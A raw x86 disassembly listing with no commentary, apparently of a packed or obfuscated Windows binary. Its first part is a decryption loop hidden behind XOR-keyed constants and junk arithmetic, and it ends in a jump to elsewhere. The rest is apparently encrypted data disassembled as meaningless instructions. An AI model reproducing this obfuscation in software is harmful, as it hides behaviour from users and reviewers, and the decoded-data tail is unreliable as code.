  403a49:	cmp    DWORD PTR ds:0x428e9b,0xd
  403a50:	jb     0x403a8c
  403a56:	jmp    0x403a67
  403a5b:	push   DWORD PTR [ebp-0x18]
  403a5e:	push   DWORD PTR [ebp-0x1c]
  403a61:	call   DWORD PTR ds:0x42aa23
  403a67:	cmp    DWORD PTR ds:0x428e9b,0xc
  403a6e:	jne    0x403a7f
  403a74:	mov    eax,ds:0x428e9b
  403a79:	inc    eax
  403a7a:	mov    ds:0x428e9b,eax
  403a7f:	cmp    DWORD PTR ds:0x428e9b,0x15
  403a86:	jb     0x403a3e
  403a8c:	mov    dl,BYTE PTR [ebp-0x21]
  403a8f:	xor    eax,0x61a1
  403a94:	mov    eax,DWORD PTR [ebp-0x34]
  403a97:	xor    al,0xaf
  403a99:	mov    cl,0xa
  403a9b:	sub    cl,al
  403a9d:	add    DWORD PTR ds:0x428ea3,0x32c3
  403aa7:	add    dl,cl
  403aa9:	sbb    ecx,DWORD PTR ds:0x428eb3
  403aaf:	mov    ecx,DWORD PTR [ebp-0x1c]
  403ab2:	sub    DWORD PTR ds:0x428ea7,0x428e8f
  403abc:	xor    cl,0xaf
  403abf:	sub    cl,0xa
  403ac2:	sub    DWORD PTR ds:0x428ea3,0x68fd
  403acc:	ror    dl,cl
  403ace:	sub    DWORD PTR ds:0x428e6b,ebx
  403ad4:	xor    eax,eax
  403ad6:	mov    eax,DWORD PTR [ebp-0xc]
  403ad9:	add    DWORD PTR ds:0x428e8f,ebx
  403adf:	mov    BYTE PTR [eax+ebx*1+0x800],dl
  403ae6:	mov    ecx,DWORD PTR ds:0x4292bb
  403aec:	mov    eax,ds:0x429747
  403af1:	sub    ecx,eax
  403af3:	and    ecx,DWORD PTR [ecx+eax*1]
  403af6:	mov    eax,DWORD PTR [ebp-0xc]
  403af9:	mov    DWORD PTR ds:0x428e33,0x15
  403b03:	cmp    DWORD PTR ds:0x428e33,0x0
  403b0a:	je     0x403b3f
  403b10:	cmp    DWORD PTR ds:0x428e33,0x25
  403b17:	jbe    0x403b3f
  403b1d:	jmp    0x403b2d
  403b22:	push   0x428e23
  403b27:	call   DWORD PTR ds:0x42aa27
  403b2d:	mov    ecx,DWORD PTR ds:0x428e33
  403b33:	dec    ecx
  403b34:	mov    DWORD PTR ds:0x428e33,ecx
  403b3a:	jmp    0x403b03
  403b3f:	mov    ecx,DWORD PTR [ebp-0x28]
  403b42:	neg    DWORD PTR ds:0x428e5b
  403b48:	sub    eax,edi
  403b4a:	sub    DWORD PTR ds:0x428e8b,0x4b02
  403b54:	xor    eax,esi
  403b56:	mov    DWORD PTR ds:0x428ec7,0x6067
  403b60:	cmp    eax,ecx
  403b62:	jne    0x403b8c
  403b68:	mov    eax,DWORD PTR [ebp-0x8]
  403b6b:	mov    ecx,DWORD PTR [ebp-0x10]
  403b6e:	xor    eax,esi
  403b70:	xor    ecx,esi
  403b72:	sub    eax,ecx
  403b74:	sub    eax,edi
  403b76:	xor    eax,esi
  403b78:	mov    DWORD PTR [ebp-0x8],eax
  403b7b:	mov    eax,DWORD PTR [ebp-0x10]
  403b7e:	xor    eax,esi
  403b80:	mov    ecx,0xffcd8d8a
  403b85:	sub    ecx,eax
  403b87:	jmp    0x403b9b
  403b8c:	mov    eax,DWORD PTR [ebp-0x10]
  403b8f:	xor    eax,esi
  403b91:	mov    ecx,0xffcd8d0a
  403b96:	sub    ecx,eax
  403b98:	add    ecx,DWORD PTR [ebp-0xc]
  403b9b:	mov    DWORD PTR [ebp-0xc],ecx
  403b9e:	mov    eax,DWORD PTR [ebp-0x8]
  403ba1:	cmp    eax,0xf89c85a5
  403ba6:	jne    0x403815
  403bac:	mov    DWORD PTR [ebp-0x34],0x9
  403bb3:	mov    ecx,DWORD PTR [ebp+0x8]
  403bb6:	xor    ecx,esi
  403bb8:	add    ecx,edi
  403bba:	jmp    0x403e1a
  403bbf:	lea    eax,[ecx+ebx*1]
  403bc2:	mov    DWORD PTR [ebp-0x2c],eax
  403bc5:	mov    eax,DWORD PTR [ebp-0x58]
  403bc8:	sub    eax,ecx
  403bca:	mov    DWORD PTR [ebp-0x1c],eax
  403bcd:	mov    eax,DWORD PTR [ebp-0x1c]
  403bd0:	mov    DWORD PTR [ebp-0x14],eax
  403bd3:	mov    eax,DWORD PTR [ebp-0x2c]
  403bd6:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  403bdd:	mov    DWORD PTR [ebp-0x54],eax
  403be0:	mov    DWORD PTR [ebp-0x20],0xf89c85a4
  403be7:	mov    eax,DWORD PTR [ebp-0x38]
  403bea:	xor    eax,esi
  403bec:	add    eax,edi
  403bee:	mov    DWORD PTR [ebp-0x10],eax
  403bf1:	mov    eax,DWORD PTR [ebp-0x38]
  403bf4:	xor    eax,esi
  403bf6:	add    eax,edi
  403bf8:	mov    DWORD PTR [ebp-0x8],eax
  403bfb:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  403c02:	mov    DWORD PTR [ebp-0x44],0xf89c85be
  403c09:	mov    eax,DWORD PTR [ebp-0x38]
  403c0c:	mov    edx,DWORD PTR [ebp-0x14]
  403c0f:	xor    eax,esi
  403c11:	add    eax,edi
  403c13:	cmp    edx,eax
  403c15:	je     0x403e0e
  403c1b:	mov    eax,DWORD PTR [ebp-0x20]
  403c1e:	xor    eax,esi
  403c20:	mov    edx,0xffcd8d0a
  403c25:	sub    edx,eax
  403c27:	add    edx,DWORD PTR [ebp-0x14]
  403c2a:	mov    eax,DWORD PTR [ebp-0x20]
  403c2d:	mov    ebx,DWORD PTR [ebp-0x10]
  403c30:	xor    eax,esi
  403c32:	add    eax,edi
  403c34:	imul   eax,ebx
  403c37:	cmp    eax,edx
  403c39:	ja     0x403e0b
  403c3f:	mov    edx,DWORD PTR [ebp-0x10]
  403c42:	mov    eax,DWORD PTR [ebp-0x14]
  403c45:	mov    ebx,DWORD PTR [ebp-0x2c]
  403c48:	sub    eax,edx
  403c4a:	xor    ebx,esi
  403c4c:	xor    edx,edx
  403c4e:	add    ebx,edi
  403c50:	div    ebx
  403c52:	mov    DWORD PTR [ebp-0x8],eax
  403c55:	mov    eax,DWORD PTR [ebp-0x44]
  403c58:	mov    edx,DWORD PTR [ebp-0x8]
  403c5b:	xor    eax,esi
  403c5d:	add    eax,edi
  403c5f:	cmp    edx,eax
  403c61:	jbe    0x403c71
  403c67:	mov    eax,DWORD PTR [ebp-0x44]
  403c6a:	xor    eax,esi
  403c6c:	add    eax,edi
  403c6e:	mov    DWORD PTR [ebp-0x8],eax
  403c71:	mov    eax,DWORD PTR [ebp-0x2c]
  403c74:	mov    edx,DWORD PTR [ebp-0x8]
  403c77:	xor    eax,esi
  403c79:	add    eax,edi
  403c7b:	imul   eax,edx
  403c7e:	mov    DWORD PTR [ebp-0x8],eax
  403c81:	mov    eax,DWORD PTR [ebp-0x38]
  403c84:	mov    edx,DWORD PTR [ebp-0x8]
  403c87:	xor    eax,esi
  403c89:	add    eax,edi
  403c8b:	cmp    edx,eax
  403c8d:	je     0x403df4
  403c93:	mov    eax,DWORD PTR [ebp-0x8]
  403c96:	mov    DWORD PTR [ebp-0x18],eax
  403c99:	mov    eax,DWORD PTR [ebp-0x10]
  403c9c:	add    eax,DWORD PTR [ebp-0x54]
  403c9f:	mov    DWORD PTR [ebp-0x1c],0xf89c85a5
  403ca6:	mov    DWORD PTR [ebp-0x8],eax
  403ca9:	mov    eax,0xf89c85a4
  403cae:	mov    DWORD PTR [ebp-0x28],eax
  403cb1:	mov    DWORD PTR [ebp-0x5c],0xf89c85a3
  403cb8:	mov    DWORD PTR [ebp-0x40],0xf89c85a2
  403cbf:	mov    DWORD PTR [ebp-0x30],eax
  403cc2:	mov    eax,DWORD PTR [ebp-0x1c]
  403cc5:	xor    eax,esi
  403cc7:	add    eax,edi
  403cc9:	jmp    0x403db0
  403cce:	mov    DWORD PTR [ebp-0x4c],0xf89c85ba
  403cd5:	mov    DWORD PTR [ebp-0x50],0xf89c858f
  403cdc:	mov    eax,DWORD PTR [ebp-0x30]
  403cdf:	mov    edx,DWORD PTR [ebp-0xc]
  403ce2:	xor    eax,esi
  403ce4:	add    eax,edi
  403ce6:	imul   eax,edx
  403ce9:	mov    edx,DWORD PTR [ebp-0x8]
  403cec:	mov    al,BYTE PTR [eax+edx*1]
  403cef:	mov    BYTE PTR [ebp-0x1],al
  403cf2:	mov    eax,DWORD PTR [ebp-0x30]
  403cf5:	mov    edx,DWORD PTR [ebp-0xc]
  403cf8:	xor    eax,esi
  403cfa:	add    eax,edi
  403cfc:	imul   eax,edx
  403cff:	mov    edx,DWORD PTR [ebp-0x5c]
  403d02:	xor    edx,esi
  403d04:	add    eax,edx
  403d06:	mov    edx,DWORD PTR [ebp-0x8]
  403d09:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f6]
  403d11:	mov    edx,DWORD PTR [ebp-0x4c]
  403d14:	xor    edx,esi
  403d16:	lea    eax,[edx+eax*1+0x3272f6]
  403d1d:	movzx  edx,BYTE PTR [ebp-0x1]
  403d21:	xor    edx,eax
  403d23:	mov    BYTE PTR [ebp-0x1],dl
  403d26:	mov    al,BYTE PTR [ebp-0x1]
  403d29:	mov    edx,DWORD PTR [ebp-0x30]
  403d2c:	mov    ebx,DWORD PTR [ebp-0xc]
  403d2f:	xor    edx,esi
  403d31:	add    edx,edi
  403d33:	imul   edx,ebx
  403d36:	mov    ebx,DWORD PTR [ebp-0x8]
  403d39:	mov    BYTE PTR [edx+ebx*1],al
  403d3c:	mov    eax,DWORD PTR [ebp-0x30]
  403d3f:	mov    edx,DWORD PTR [ebp-0xc]
  403d42:	xor    eax,esi
  403d44:	add    eax,edi
  403d46:	imul   eax,edx
  403d49:	mov    edx,DWORD PTR [ebp-0x8]
  403d4c:	mov    al,BYTE PTR [eax+edx*1]
  403d4f:	mov    BYTE PTR [ebp-0x1],al
  403d52:	mov    eax,DWORD PTR [ebp-0x30]
  403d55:	mov    edx,DWORD PTR [ebp-0xc]
  403d58:	xor    eax,esi
  403d5a:	add    eax,edi
  403d5c:	imul   eax,edx
  403d5f:	mov    edx,DWORD PTR [ebp-0x28]
  403d62:	xor    edx,esi
  403d64:	add    eax,edx
  403d66:	mov    edx,DWORD PTR [ebp-0x8]
  403d69:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f6]
  403d71:	mov    edx,DWORD PTR [ebp-0x50]
  403d74:	xor    edx,esi
  403d76:	lea    eax,[edx+eax*1+0x3272f6]
  403d7d:	movzx  edx,BYTE PTR [ebp-0x1]
  403d81:	xor    edx,eax
  403d83:	mov    BYTE PTR [ebp-0x1],dl
  403d86:	mov    al,BYTE PTR [ebp-0x1]
  403d89:	mov    edx,DWORD PTR [ebp-0x30]
  403d8c:	mov    ebx,DWORD PTR [ebp-0xc]
  403d8f:	xor    edx,esi
  403d91:	add    edx,edi
  403d93:	imul   edx,ebx
  403d96:	mov    ebx,DWORD PTR [ebp-0x8]
  403d99:	mov    BYTE PTR [edx+ebx*1],al
  403d9c:	mov    eax,DWORD PTR [ebp-0x40]
  403d9f:	mov    edx,DWORD PTR [ebp-0x28]
  403da2:	xor    eax,esi
  403da4:	xor    edx,esi
  403da6:	add    eax,edi
  403da8:	add    edx,edi
  403daa:	imul   eax,edx
  403dad:	add    eax,DWORD PTR [ebp-0xc]
  403db0:	mov    DWORD PTR [ebp-0xc],eax
  403db3:	mov    eax,DWORD PTR [ebp-0xc]
  403db6:	mov    edx,DWORD PTR [ebp-0x18]
  403db9:	cmp    edx,eax
  403dbb:	jb     0x403cce
  403dc1:	mov    eax,DWORD PTR [ebp-0x28]
  403dc4:	mov    edx,DWORD PTR [ebp-0x18]
  403dc7:	xor    eax,esi
  403dc9:	add    eax,edi
  403dcb:	imul   eax,edx
  403dce:	mov    edx,DWORD PTR [ebp-0x1c]
  403dd1:	xor    edx,esi
  403dd3:	add    edx,edi
  403dd5:	or     eax,edx
  403dd7:	mov    edx,DWORD PTR [ebp-0x20]
  403dda:	xor    edx,esi
  403ddc:	add    eax,edx
  403dde:	mov    edx,DWORD PTR [ebp-0x20]
  403de1:	xor    edx,esi
  403de3:	add    eax,edx
  403de5:	mov    edx,DWORD PTR [ebp-0x10]
  403de8:	lea    eax,[eax+edx*1+0x64e5ec]
  403def:	jmp    0x403e03
  403df4:	mov    eax,DWORD PTR [ebp-0x20]
  403df7:	mov    edx,DWORD PTR [ebp-0x10]
  403dfa:	xor    eax,esi
  403dfc:	lea    eax,[eax+edx*1+0x3272f6]
  403e03:	mov    DWORD PTR [ebp-0x10],eax
  403e06:	jmp    0x403c1b
  403e0b:	mov    ebx,DWORD PTR [ebp-0x3c]
  403e0e:	mov    eax,DWORD PTR [ebp+0xc]
  403e11:	xor    eax,esi
  403e13:	lea    ecx,[ecx+eax*1+0x3272f6]
  403e1a:	lea    eax,[ecx-0x3272f6]
  403e20:	xor    eax,esi
  403e22:	cmp    eax,0xf89c95a5
  403e27:	jne    0x403bbf
  403e2d:	dec    DWORD PTR [ebp-0x34]
  403e30:	jne    0x403bb3
  403e36:	mov    eax,DWORD PTR [ebp+0x8]
  403e39:	mov    ecx,DWORD PTR [ebp+0xc]
  403e3c:	mov    edx,DWORD PTR [ebp+0x8]
  403e3f:	xor    ecx,esi
  403e41:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272f6]
  403e48:	xor    eax,esi
  403e4a:	mov    al,BYTE PTR [eax+ebx*1+0x3272f6]
  403e51:	xor    edx,esi
  403e53:	mov    BYTE PTR [edx+ebx*1+0x3272f6],cl
  403e5a:	mov    ecx,DWORD PTR [ebp+0xc]
  403e5d:	xor    ecx,esi
  403e5f:	jmp    0x4061b8
  403e64:	outs   dx,BYTE PTR ds:[esi]
  403e65:	pop    edi
  403e66:	or     al,BYTE PTR [bp+0xa]
  403e6a:	push   cs
  403e6b:	pop    ss
  403e6c:	xor    edx,esi
  403e6e:	cld    
  403e6f:	fwait
  403e70:	push   es
  403e71:	rcl    BYTE PTR [edi],cl
  403e73:	rol    BYTE PTR [edi+0x60],cl
  403e76:	add    DWORD PTR [ebx-0x7c7c9fb9],0xffffffe2
  403e7d:	add    al,BYTE PTR [edi]
  403e7f:	in     al,0xe1
  403e81:	inc    eax
  403e82:	sbb    DWORD PTR [ebx-0x2761d756],edx
  403e88:	push   edx
  403e89:	push   ebx
  403e8a:	shl    esp,1
  403e8c:	pop    ebx
  403e8d:	cwde   
  403e8e:	pop    eax
  403e8f:	arpl   cx,si
  403e91:	sbb    esp,esp
  403e93:	loopne 0x403e51
  403e95:	(bad)  
  403e98:	sahf   
  403e99:	pop    ebp
  403e9a:	ins    BYTE PTR es:[edi],dx
  403e9b:	test   DWORD PTR [edx+0x46],edi
  403e9e:	inc    esp
  403e9f:	adc    BYTE PTR [edi-0x4180185b],bh
  403ea5:	mov    ebx,0x1f3b5a28
  403eaa:	jo     0x403ea2
  403eac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ead:	arpl   WORD PTR [esi+0x39316689],dx
  403eb3:	push   esi
  403eb4:	and    al,0xd8
  403eb6:	lods   eax,DWORD PTR ds:[esi]
  403eb7:	fcmovb st,st(2)
  403eb9:	in     al,0x89
  403ebb:	iret   
  403ebc:	sbb    edx,DWORD PTR [edx]
  403ebe:	cmp    BYTE PTR [ebx+0x72c9ba7b],0xda
  403ec5:	push   0x24
  403ec7:	push   esp
  403ec8:	les    edx,FWORD PTR [eax]
  403eca:	xchg   edi,eax
  403ecb:	retf   0x9ef9
  403ece:	outs   dx,BYTE PTR ds:[esi]
  403ecf:	aas    
  403ed0:	xchg   esi,eax
  403ed1:	gs mov ecx,0x275e616f
  403ed7:	mov    dl,0xd9
  403ed9:	rcr    DWORD PTR [esi],1
  403edb:	cmc    
  403edc:	sub    eax,0x2be166d8
  403ee1:	(bad)  
  403ee3:	(bad)  
  403ee4:	repz push ebx
  403ee6:	pop    ecx
  403ee7:	and    esi,DWORD PTR [edx-0x753efdfe]
  403eed:	pop    edi
  403eee:	lahf   
  403eef:	jg     0x403ecb
  403ef1:	cmp    DWORD PTR [ebx],ebx
  403ef3:	jnp    0x403f4b
  403ef5:	and    al,0x29
  403ef7:	or     DWORD PTR [ecx-0x667bb0d4],eax
  403efd:	mov    esi,0x5f573aa0
  403f02:	test   al,0xf2
  403f04:	gs repnz inc esp
  403f07:	sbb    ebx,DWORD PTR [edi]
  403f09:	add    DWORD PTR [edx+0x1f],ebp
  403f0c:	(bad)  
  403f0d:	jge    0x403ec1
  403f0f:	rol    BYTE PTR [edi-0x32],0x73
  403f13:	mov    al,0x17
  403f15:	test   BYTE PTR [ebp-0x31814470],0x52
  403f1c:	test   ah,bh
  403f1e:	je     0x403f83
  403f20:	push   0xffffffe1
  403f22:	sbb    al,0x29
  403f24:	fwait
  403f25:	add    bl,dh
  403f27:	inc    edi
  403f28:	cmp    eax,ebx
  403f2a:	ja     0x403edb
  403f2c:	mov    ebp,0x72696f13
  403f31:	pop    ds
  403f32:	fstp   DWORD PTR [esi]
  403f34:	pop    ebp
  403f35:	mov    ch,0x2a
  403f37:	sahf   
  403f38:	inc    eax
  403f39:	repnz inc ebx
  403f3b:	jmp    DWORD PTR [ebx]
  403f3d:	sti    
  403f3e:	aaa    
  403f3f:	les    esi,FWORD PTR [eax+edi*8-0x3be892e5]
  403f46:	test   DWORD PTR ss:[ebx-0x6f],0x2c8bca4c
  403f4e:	sahf   
  403f4f:	xchg   esp,eax
  403f50:	shl    BYTE PTR [edi-0x48],1
  403f53:	out    dx,al
  403f54:	inc    esp
  403f55:	jp     0x403f92
  403f57:	mov    ds:0x9716bec9,al
  403f5c:	inc    edx
  403f5d:	in     eax,0x0
  403f5f:	adc    edx,DWORD PTR [ebx+0x65189d84]
  403f65:	sub    DWORD PTR [edi],0xffffffb9
  403f68:	in     al,0xcc
  403f6a:	ficomp WORD PTR [ecx+0x7c]
  403f6d:	xchg   BYTE PTR fs:[esi],cl
  403f70:	repz dec esi
  403f72:	jecxz  0x403fa9
  403f74:	and    BYTE PTR [edi+ebp*4-0x3f],ch
  403f78:	data16 adc BYTE PTR [ebx+0x6174439],cl
  403f7f:	sbb    bl,dh
  403f81:	mov    al,0x89
  403f83:	mov    DWORD PTR [esi],edi
  403f85:	in     al,dx
  403f86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f87:	pop    edi
  403f88:	mov    eax,ds:0xcd51383b
  403f8d:	ror    DWORD PTR [ecx+0x31],cl
  403f90:	addr16 nop
  403f92:	fsubr  QWORD PTR [eax+0x40]
  403f95:	or     bl,BYTE PTR [edx+0x49]
  403f98:	cld    
  403f99:	mov    BYTE PTR [esi+0x2e],al
  403f9c:	cmc    
  403f9d:	xchg   ecx,eax
  403f9e:	aaa    
  403f9f:	xor    al,0x8c
  403fa1:	xor    edx,DWORD PTR [edx]
  403fa3:	int    0x54
  403fa5:	xchg   ebp,esp
  403fa7:	dec    edi
  403fa8:	add    BYTE PTR [eax+0x7c7d7e9b],0xd6
  403faf:	test   DWORD PTR [eax+0x59339b37],ecx
  403fb5:	xchg   edi,eax
  403fb6:	imul   edi,DWORD PTR [edx+0x7404d6bc],0xb6693d2f
  403fc0:	jo     0x403f5c
  403fc2:	stc    
  403fc3:	xchg   ebx,eax
  403fc4:	or     ebx,DWORD PTR [edi-0x79069705]
  403fca:	xchg   ebx,eax
  403fcb:	enter  0x29ff,0xff
  403fcf:	mov    esp,0x32a5fd62
  403fd4:	inc    ebx
  403fd5:	les    ebp,FWORD PTR [esi+0x59dfc6cd]
  403fdb:	push   ds
  403fdc:	test   eax,0xbff0624d
  403fe1:	dec    edi
  403fe2:	sbb    DWORD PTR [ebp+0x49],edi
  403fe5:	adc    DWORD PTR [ecx+0x79],ebx
  403fe8:	loop   0x403fac
  403fea:	xor    BYTE PTR [edx],bl
  403fec:	call   DWORD PTR [edx+0x3354b7e5]
  403ff2:	pop    edx
  403ff3:	test   eax,0x3da9cf4b
  403ff8:	fsub   DWORD PTR [edi]
  403ffa:	cmc    
  403ffb:	mov    esp,0xf32b436
  404000:	adc    DWORD PTR [edx-0x161a0076],0x153c11f9
  40400a:	das    
  40400b:	outs   dx,BYTE PTR ds:[esi]
  40400c:	push   esi
  40400d:	daa    
  40400e:	(bad)  
  404010:	or     bh,BYTE PTR [esi-0x7a3ce65c]
  404016:	movzx  edi,ah
  404019:	div    DWORD PTR [ebp+0x67]
  40401c:	ins    BYTE PTR es:[edi],dx
  40401d:	cld    
  40401e:	jbe    0x404070
  404020:	xor    ah,BYTE PTR [ebp+edi*8+0x3fa48c1d]
  404027:	leave  
  404028:	lahf   
  404029:	mov    dl,0xce
  40402b:	lods   eax,DWORD PTR ds:[esi]
  40402c:	mov    eax,0xed182737
  404031:	in     eax,0x62
  404033:	or     al,0x9f
  404035:	neg    BYTE PTR [edx-0x6c]
  404038:	hlt    
  404039:	ficomp DWORD PTR ds:0x6eb7aacc
  40403f:	jbe    0x403ff9
  404041:	rcr    DWORD PTR [edi],cl
  404043:	das    
  404044:	call   0xabea:0xe16a165e
  40404b:	jo     0x4040ac
  40404d:	bound  eax,QWORD PTR [ebp-0x5f]
  404050:	scas   al,BYTE PTR es:[edi]
  404051:	add    eax,0x67ffe454
  404056:	ret    
  404057:	daa    
  404058:	push   ds
  404059:	dec    edi
  40405a:	xor    DWORD PTR [ebp-0x55],ebx
  40405d:	iret   
  40405e:	lds    esi,FWORD PTR [eax]
  404060:	cdq    
  404061:	mov    eax,0xfddbced1
  404066:	retf   
  404067:	jg     0x404031
  404069:	xor    edx,ebp
  40406b:	inc    ebx
  40406c:	adc    BYTE PTR [edx],ch
  40406e:	inc    esp
  40406f:	jae    0x4040a7
  404071:	sub    BYTE PTR [ecx+0x5c],ch
  404074:	stos   BYTE PTR es:[edi],al
  404075:	int    0x4c
  404077:	gs aam 0xb4
  40407a:	and    edx,DWORD PTR [ecx-0x31a5f7ef]
  404080:	int    0xe0
  404082:	mov    ss,WORD PTR [eax-0x1a]
  404085:	imul   edx,edi,0xffffff8e
  404088:	dec    esi
  404089:	gs hlt 
  40408b:	in     al,dx
  40408c:	(bad)  
  40408d:	imul   esp,DWORD PTR [edi],0x6b
  404090:	pop    ds
  404091:	ss aaa 
  404093:	or     BYTE PTR [ebx+0x5d],dh
  404096:	dec    esp
  404097:	les    esp,FWORD PTR [eax+0x65]
  40409a:	jg     0x4040a1
  40409c:	mov    ah,0xb7
  40409e:	inc    ebp
  40409f:	lods   eax,DWORD PTR ds:[esi]
  4040a0:	ja     0x40406c
  4040a2:	aam    0x9f
  4040a4:	sbb    DWORD PTR [eax],esi
  4040a6:	pop    ss
  4040a7:	jno    0x40410b
  4040a9:	mov    eax,0xb077e410
  4040ae:	popf   
  4040af:	jp     0x4040dd
  4040b1:	xchg   edi,eax
  4040b2:	in     eax,dx
  4040b3:	add    edi,esp
  4040b5:	inc    ebx
  4040b6:	repz mov al,ds:0xe6e6930a
  4040bc:	xchg   esp,eax
  4040bd:	(bad)  
  4040be:	xlat   BYTE PTR ds:[ebx]
  4040bf:	rol    DWORD PTR [edi+0xc],1
  4040c2:	js     0x4040c5
  4040c4:	nop
  4040c5:	out    0x9c,al
  4040c7:	push   esp
  4040c8:	sbb    BYTE PTR [esi],cl
  4040ca:	adc    al,dh
  4040cc:	rcl    BYTE PTR [edx],1
  4040ce:	fsubr  DWORD PTR [edi]
  4040d0:	mov    edi,DWORD PTR [edi]
  4040d2:	arpl   di,bp
  4040d4:	das    
  4040d5:	popf   
  4040d6:	shl    DWORD PTR [esi+eiz*1-0x70],cl
  4040da:	in     eax,0x79
  4040dc:	pop    edx
  4040dd:	pop    eax
  4040de:	jle    0x404088
  4040e0:	cld    
  4040e1:	adc    ch,al
  4040e3:	pusha  
  4040e4:	stos   BYTE PTR es:[edi],al
  4040e5:	aam    0x8f
  4040e7:	cmp    al,cl
  4040e9:	jge    0x4040c2
  4040eb:	pop    ecx
  4040ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040ed:	cli    
  4040ee:	addr16 xchg ebx,edi
  4040f1:	jbe    0x404141
  4040f3:	cs aam 0x31
  4040f6:	into   
  4040f7:	cdq    
  4040f8:	fldenv ds:0xd1989853
  4040fe:	pop    ebp
  4040ff:	mov    gs,ebp
  404101:	cli    
  404102:	fidivr WORD PTR [eax+0x58]
  404105:	mov    edx,0xa76fdd9c
  40410a:	inc    eax
  40410b:	or     BYTE PTR [eax+ecx*8-0x76],ch
  40410f:	sbb    BYTE PTR [ecx+0x1357c6ce],0xc
  404116:	push   0x7516d75b
  40411b:	push   eax
  40411c:	jmp    DWORD PTR [edi]
  40411e:	jp     0x4040bd
  404120:	(bad)  
  404121:	jl     0x404126
  404123:	mov    bh,0xb9
  404125:	mov    edi,0x9b551372
  40412a:	ret    0xe06
  40412d:	rcl    BYTE PTR [eax+0x2dbd7413],1
  404133:	jnp    0x4040b5
  404135:	test   BYTE PTR [ecx+0x11],dh
  404138:	pop    ds
  404139:	and    bl,bh
  40413b:	mov    cl,0xd9
  40413d:	fs retf 
  40413f:	ins    BYTE PTR es:[edi],dx
  404140:	out    0xbb,al
  404142:	sub    dh,cl
  404144:	bound  esp,QWORD PTR [edi-0x6e]
  404147:	add    BYTE PTR [esi+0x6cd97d20],0x15
  40414e:	sti    
  40414f:	fcomp  st(6)
  404151:	ss cmp ah,0x35
  404155:	push   ecx
  404156:	push   ss
  404157:	pop    ss
  404158:	pop    es
  404159:	aaa    
  40415a:	cmovge esp,esi
  40415d:	shr    DWORD PTR [ebx+edx*2-0x2d],0x8a
  404162:	push   0xa01be607
  404167:	sbb    edx,DWORD PTR ds:0x21a07ad8
  40416d:	sub    bh,bh
  40416f:	or     bl,BYTE PTR [esi+0x11dc2150]
  404175:	in     al,0xab
  404177:	mov    DWORD PTR [esi+0x74],ebp
  40417a:	inc    edi
  40417b:	and    esi,DWORD PTR [eax-0x4b]
  40417e:	inc    ecx
  40417f:	jp     0x404139
  404181:	jbe    0x4041fd
  404183:	inc    ebx
  404184:	mov    eax,ds:0x8ac55f65
  404189:	mov    ecx,0x77293d79
  40418e:	adc    eax,0x1ffe563e
  404193:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404194:	int    0x5
  404196:	mov    WORD PTR [edx+0x224a83f9],gs
  40419c:	retf   0xdc0f
  40419f:	mov    ?,WORD PTR [ecx-0x70]
  4041a2:	imul   BYTE PTR [ebx+0x2c32111a]
  4041a8:	dec    ebp
  4041a9:	xchg   edx,eax
  4041aa:	sbb    DWORD PTR [edi-0x48],edx
  4041ad:	outs   dx,BYTE PTR ds:[esi]
  4041ae:	pop    ecx
  4041af:	dec    ebp
  4041b0:	xor    al,0x42
  4041b2:	inc    ecx
  4041b3:	or     ebx,DWORD PTR gs:[ecx+eax*1]
  4041b7:	aaa    
  4041b8:	mov    WORD PTR [ebp-0xe630782],ds
  4041be:	cmp    DWORD PTR [eax],ebp
  4041c0:	adc    DWORD PTR [ebp+eax*4+0x66353fce],ecx
  4041c7:	jmp    0x802eddcf
  4041cc:	int    0x13
  4041ce:	or     WORD PTR ds:0xfad149f6,bp
  4041d5:	inc    ebp
  4041d6:	sti    
  4041d7:	jmp    0x40416c
  4041d9:	mov    ds:0x1c01c70,eax
  4041de:	arpl   WORD PTR [edi+0x10],bp
  4041e1:	daa    
  4041e2:	fwait
  4041e3:	fwait
  4041e4:	push   ebp
  4041e5:	pop    ds
  4041e6:	lods   al,BYTE PTR ds:[esi]
  4041e7:	inc    ecx
  4041e8:	xor    al,0x9c
  4041ea:	inc    ebx
  4041eb:	rcr    BYTE PTR [eax-0x4392ff37],0x2b
  4041f2:	xor    al,0x7f
  4041f4:	mov    eax,ds:0x9b269811
  4041f9:	cli    
  4041fa:	enter  0xf2fb,0x66
  4041fe:	jnp    0x40425c
  404200:	cmp    al,0xf1
  404202:	sbb    al,cl
  404204:	sar    BYTE PTR [edx-0x2d],1
  404207:	mov    eax,ds:0x9273f676
  40420c:	adc    al,0x41
  40420e:	adc    ch,bl
  404210:	in     eax,0xb6
  404212:	ja     0x404221
  404214:	and    ah,dh
  404216:	jb     0x4041cf
  404218:	cmp    BYTE PTR [esi+0x2a],ch
  40421b:	fnstsw WORD PTR [edi+0x32]
  40421e:	push   ds
  40421f:	sub    eax,DWORD PTR [edi-0x72]
  404222:	push   edx
  404223:	xchg   ebp,eax
  404224:	lock xchg ebx,eax
  404226:	mov    dl,0x69
  404228:	push   es
  404229:	mov    ds:0x74333d7,al
  40422e:	cdq    
  40422f:	popf   
  404230:	adc    ah,BYTE PTR [edx]
  404232:	in     al,dx
  404233:	xchg   DWORD PTR [ecx+0x2af27a05],esi
  404239:	loope  0x4041cc
  40423b:	pusha  
  40423c:	mov    ebp,0x34c39979
  404241:	clc    
  404242:	xor    eax,0xc7c42c46
  404247:	push   ebp
  404248:	pop    edi
  404249:	or     eax,0xe91cb93e
  40424e:	and    dl,dl
  404250:	jmp    0xd8f3:0x85346ac
  404257:	sbb    DWORD PTR [esi],esi
  404259:	and    BYTE PTR [edx+0x25],bh
  40425c:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40425e:	mov    ebp,0x4cff50d7
  404263:	mov    edi,0x993f7461
  404268:	jg     0x40424e
  40426a:	or     BYTE PTR [edi-0x1bdb8f78],dl
  404270:	inc    eax
  404271:	cs pop ebx
  404273:	rcr    DWORD PTR [esi],1
  404275:	fistp  WORD PTR [esi+0x6247eb84]
  40427b:	imul   edi,DWORD PTR [ebx+0x5f],0x34b8549b
  404282:	or     al,0x38
  404284:	int    0x27
  404286:	xchg   ebp,eax
  404287:	rcl    DWORD PTR [esi+0x3f2962fd],cl
  40428d:	(bad)  
